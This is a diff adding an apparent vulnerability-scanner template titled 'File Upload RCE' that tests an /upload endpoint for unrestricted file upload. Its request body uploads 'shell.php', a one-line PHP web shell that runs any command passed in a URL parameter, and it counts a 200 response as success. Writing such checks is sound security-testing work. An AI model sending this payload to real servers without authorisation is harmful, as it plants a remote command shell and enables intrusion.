@@ -1,0 +1,16 @@
+id: file-upload-rce
+info:
+  name: File Upload RCE
+  author: project-c
+  severity: critical
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+    headers:
+      Content-Type: multipart/form-data
+    body: "----WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system($_GET['cmd']); ?>\r\n----WebKitFormBoundary--"
+    matchers:
+      - type: status
+        status:
+          - 200
